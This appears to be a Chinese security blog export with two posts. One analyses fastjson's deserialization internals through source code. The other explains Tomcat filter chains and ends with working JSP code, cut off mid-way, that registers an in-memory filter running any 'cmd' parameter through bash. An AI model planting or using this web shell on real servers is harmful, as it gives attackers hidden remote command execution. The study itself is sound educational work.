<h3 id="No7-parseObject-gt-getDeserializer-gt-createJavaBeanDeserializer"><a href="#No7-parseObject-gt-getDeserializer-gt-createJavaBeanDeserializer" class="headerlink" title="No7 parseObject()-&gt;getDeserializer()-&gt;createJavaBeanDeserializer()"></a>No7 parseObject()-&gt;getDeserializer()-&gt;createJavaBeanDeserializer()</h3><p>过了黑名单以后，就会与一些fastjson支持的类进行匹配，如果匹配到了就会返回相应的Deserializer<br>如果匹配不到就到下图代码中的地方<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/16.jpg" alt><br>进入到这个函数中会先获取一下clazz的父类，然后就到了这里<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/17.jpg" alt><br>主要就是通过获取构造函数和一些成员方法构建了一个JavaBeanInfo类，并返回<br>这里需要提的是，他在内部会判断一个成员方法是否是setXxx方法或getXxx方法，如果符合一些条件就会添加入fieldList这个数组中<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//set的</span></span><br><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; </span><br><span class="line">!Modifier.isStatic(method.getModifiers()) &amp;&amp; </span><br><span class="line">(method.getReturnType().equals(Void.TYPE) || </span><br><span class="line">method.getReturnType().equals(method.getDeclaringClass())))&#123;</span><br><span class="line">    <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123;</span><br><span class="line">        add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(</span><br><span class="line">                propertyName, </span><br><span class="line">                method, </span><br><span class="line">                field, </span><br><span class="line">                clazz, </span><br><span class="line">                type, </span><br><span class="line">                ordinal, </span><br><span class="line">                serialzeFeatures, </span><br><span class="line">                parserFeatures, </span><br><span class="line">                annotation, </span><br><span class="line">                fieldAnnotation, </span><br><span class="line">                (String)<span class="literal">null</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get的</span></span><br><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; </span><br><span class="line">!Modifier.isStatic(method.getModifiers()) &amp;&amp; </span><br><span class="line">methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; </span><br><span class="line">Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; </span><br><span class="line">method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; </span><br><span class="line">(Collection.class.isAssignableFrom(method.getReturnType()) ||</span><br><span class="line">Map.class.isAssignableFrom(method.getReturnType()) || </span><br><span class="line">AtomicBoolean.class == method.getReturnType() || </span><br><span class="line">AtomicInteger.class == method.getReturnType() || </span><br><span class="line">AtomicLong.class == method.getReturnType()))&#123;</span><br><span class="line">    add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(</span><br><span class="line">            propertyName, </span><br><span class="line">            method, </span><br><span class="line">            (Field)<span class="literal">null</span>, </span><br><span class="line">            clazz, </span><br><span class="line">            type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line">            annotation, </span><br><span class="line">            (JSONField)<span class="literal">null</span>, </span><br><span class="line">            (String)<span class="literal">null</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>从上面的代码可以看出，如果要把set方法添加进入fieldList，那么此方法需要满足的几个点</p>
<ul>
<li>返回值为void类型或者返回值的类型是当前类</li>
<li>不能是静态方法</li>
<li>开头是set<br>我这里用下面两块代码来解释一下第一点<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Student <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>get的满足条件</p>
<ul>
<li>Method不是静态的</li>
<li>Method无参数</li>
<li>Method的返回类型要继承自上面所写的类</li>
</ul>
<p>接下来解释一下FieldInfo的几个重要参数</p>
<ul>
<li>propertyName，简而言之就是getXxx或setXxx的Xxx，也就是相应方法的变量名称，是一个字符串类型</li>
<li>method，就是一个Method类，是getXxx或setXxx的反射</li>
</ul>
<p>这个fieldList在后面调用方法的时候有重要作用<br>当把所有相应的方法加到fieldList中后，就到了这个函数的最后一步<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/18.jpg" alt><br><code>return new JavaBeanInfo(clazz, builderClass, defaultConstructor, null, null, buildMethod, jsonType, fieldList);</code><br>会把fieldList和该class类的反射封装到JavaBeanInfo里面<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/19.jpg" alt><br>这里需要注意一下这段代码，他会把传入的fieldList进行一个排序，然后赋值给sortedFields<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/20.jpg" alt><br>接下来走到这，重新new了一个JavaBeanDeserializer对象，不过和上面的步骤相同，然后返回</p>
<h3 id="No8-parseObject-gt-deserializer-deserialze"><a href="#No8-parseObject-gt-deserializer-deserialze" class="headerlink" title="No8 parseObject()-&gt;deserializer.deserialze()"></a>No8 parseObject()-&gt;deserializer.deserialze()</h3><p>返回以后最后赋值给了deserializer，也就是No6<br>我们看到deserializer有一个sortedFieldDesrializers，也就是No7中的sortedFields<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/21.jpg" alt><br>接下来直接看到parseField<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/22.jpg" alt><br>这个函数主要就是用来调用getXxx或者setXxx，对Xxx进行一些赋值操作<br>进入此函数，可以看到开头有一个smartMatch<br>节选一段重要代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> FieldDeserializer <span class="title function_">smartMatch</span><span class="params">(String key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (snakeOrkebab) &#123;</span><br><span class="line">        fieldDeserializer = getFieldDeserializer(key2);</span><br><span class="line">        <span class="keyword">if</span> (fieldDeserializer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (FieldDeserializer fieldDeser : sortedFieldDeserializers) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldDeser.fieldInfo.name.equalsIgnoreCase(key2)) &#123;</span><br><span class="line">                    fieldDeserializer = fieldDeser;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>key2就是getXxx或者setXxx对应的Xxx<br>上面的代码就是从sortedFieldDeserializers数组中（No7中的fieldList）寻找是否有可以匹配得到的，匹配得到就返回FieldDeserializer，匹配不到就返回null<br>如果是null就会执行的下面的代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">deserOrField</span> <span class="operator">=</span> extraFieldDeserializers.get(key);</span><br><span class="line"><span class="keyword">if</span> (deserOrField != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (deserOrField <span class="keyword">instanceof</span> FieldDeserializer) &#123;</span><br><span class="line">        fieldDeserializer = ((FieldDeserializer) deserOrField);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> (Field) deserOrField;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(key, field.getDeclaringClass(), field.getType(), field.getGenericType(), field, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        fieldDeserializer = <span class="keyword">new</span> <span class="title class_">DefaultFieldDeserializer</span>(parser.getConfig(), clazz, fieldInfo);</span><br><span class="line">        extraFieldDeserializers.put(key, fieldDeserializer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>从extraFieldDeserializers中get相应的field<br>extraFieldDeserializers是一个HashMap，键是所有的成员变量，值是成员变量对应的field，最后fieldDeserializer就是对相应field进行一次封装<br>最后用这个封装好的类进行parseField<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/24.jpg" alt></p>
<h3 id="No9-parseObject-gt-deserializer-deserialze-gt-parseField-gt-fieldDeserializer-parseField"><a href="#No9-parseObject-gt-deserializer-deserialze-gt-parseField-gt-fieldDeserializer-parseField" class="headerlink" title="No9 parseObject()-&gt;deserializer.deserialze()-&gt;parseField()-&gt;fieldDeserializer.parseField()"></a>No9 parseObject()-&gt;deserializer.deserialze()-&gt;parseField()-&gt;fieldDeserializer.parseField()</h3><p>首先对value进行解析，这里可以看到，如果是byte类型，那么就会对其进行一个base64解码<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/23.jpg" alt><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/25.jpg" alt><br>所以如果要给byte类型进行反序列化，那么就需要先进行一次base64加密<br>赋值完以后就进入了setValue操作，给反序列化的对象设置值<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/26.jpg" alt><br>setValue的实现<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object object, Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span> <span class="comment">//</span></span><br><span class="line">        &amp;&amp; fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> fieldInfo.method;</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                    <span class="type">AtomicInteger</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicInteger) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicInteger) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                    <span class="type">AtomicLong</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicLong) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicLong) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                    <span class="type">AtomicBoolean</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicBoolean) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicBoolean) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (map != <span class="literal">null</span>) &#123;</span><br><span class="line">                        map.putAll((Map) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> (Collection) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (collection != <span class="literal">null</span>) &#123;</span><br><span class="line">                        collection.addAll((Collection) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                method.invoke(object, value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> fieldInfo.field;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                    <span class="type">AtomicInteger</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicInteger) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicInteger) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                    <span class="type">AtomicLong</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicLong) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicLong) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                    <span class="type">AtomicBoolean</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicBoolean) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicBoolean) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(fieldInfo.fieldClass)) &#123;</span><br><span class="line">                    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (map != <span class="literal">null</span>) &#123;</span><br><span class="line">                        map.putAll((Map) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> (Collection) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (collection != <span class="literal">null</span>) &#123;</span><br><span class="line">                        collection.addAll((Collection) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">                    field.set(object, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;set property error, &quot;</span> + fieldInfo.name, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>大致的思路就是看之前的fieldInfo中是否有method，在No7中有相关的操作，如果有就会去invoke。<br>所以如果有相关的getXxx方法或者setXxx想去调用，那在反序列化的时候必须把相关的Xxx变量加到json数据中，这样才会有相应的变量封装到fieldDeserializer（No8步骤），之后才会在setValue的时候去调用对应的getXxx或者setXxx方法</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>大致思路就是如此，光听文章分析能学到的东西是很有限的，最后还是需要自己动手去调试。</p>
<p>在写这篇文章之前也不知道一些绕过方法，只是分析了一下fastjson的原理，后面看到网上的那些方法，没想到我竟然凑巧把这些绕过payload自己搞出来了，还是有点小高兴。所以说知道原理还是很重要的。<br>在下一篇就研究一下fastjson的反序列化利用，和一些绕过payload</p>
]]></content>
      <categories>
        <category>fastjson</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Filter内存马</title>
    <url>/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对Filter内存马原理的简单分析<br><span id="more"></span></p>
<h2 id="Filter注册流程"><a href="#Filter注册流程" class="headerlink" title="Filter注册流程"></a>Filter注册流程</h2><p>用一张图来描述一下tomcat的基本加载流程<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/1.jpg" alt><br>可以看到FilterChain是在WrapperValue容器中调用的<br>而FilterChain，顾名思义，就是一个Filter的链，从第一个Filter一直传到最后一个Filter，然后才调用Servlet</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>首先调试Filter内存马需要先在pom.xml加<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.67<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这里的version我选得是和我tomcat的版本一样，不知道有没有联系<br><strong>不加次依赖是无法调试的</strong></p>
<p>先写一个简单的Filter容器<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterA</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;a: before&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        pw.write(<span class="string">&quot;aaaaaaaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        System.out.println(<span class="string">&quot;a: after&quot;</span>);</span><br><span class="line"></span><br><span class="line">        pw.write(<span class="string">&quot;&lt;br&gt;back&quot;</span>);</span><br><span class="line">        pw.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在doFilter第一行代码下断点，根据调用栈可以看到WrapperValue容器<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/2.jpg" alt></p>
<p>进入WrapperValue，往上翻找可以看到filterChain的来源，在此处下断点，重新调试<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/3.jpg" alt></p>
<p>进入createFilterChain，注意到这一行代码，可以看到这里面有我们的Filter链，是一个Map，另外一条应该是tomcat自带的filter，这行就是从context对象中获取现有的Filter链<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/4.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/5.jpg" alt></p>
<p>往下到了一个循环处，是根据上面得到的filterMap，去依次从context中取出filterConfig<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/6.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/7.jpg" alt></p>
<p>获取到filterConfig后就会将filterConfig加入filterChain中，该filterChain对象中的filters列表会添加filterConfig<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/8.jpg" alt></p>
<p>创建完FilterChain后，来到filterChain的doFilter方法<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/9.jpg" alt></p>
<p>跟着调试，会进入internalDofilter方法，n是Filter个数，pos是当前是第几个Filter<br>首先会取出当前的filterConfig，并通过getFilter函数，从filterConfig取出filter对象<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/10.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/11.jpg" alt></p>
<p>最后拿到filter对象了，通过doFilter调用具体的Filter，也就是我们写的那个demo<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/12.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/13.jpg" alt></p>
<p>那么该调用过程就分析的差不多了</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
<li>先从context中获取filterMaps</li>
<li>根据filterMaps从context中取出filterConfig</li>
<li>将filterConfig加入filterChain中，filterChain中的filters成员变量会添加filterConfig</li>
<li>调用doFilter</li>
</ul>
<h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><p>通过上面的分析，我们知道如果想将木马注册到filter中，那么就需要context对象的两个参数</p>
<ul>
<li>filterMaps</li>
<li>filterConfigs</li>
</ul>
<p>在他们两个Map中添加相应的filter就行了</p>
<p>但是，当我们去看filterConfigs相应的构造函数代码，会发现需要传递 Context和filterDef，且并不带有public，那么就需要通过反射获取<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/14.jpg" alt></p>
<p>context就是上面分析的那个context<br>所以最后需要三个参数，具体如何生成可以看相应的构造函数</p>
<ul>
<li>filterMaps</li>
<li>filterConfigs</li>
<li>filterDef</li>
</ul>
<p>那么最终的代码如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;abcd&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name)==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span 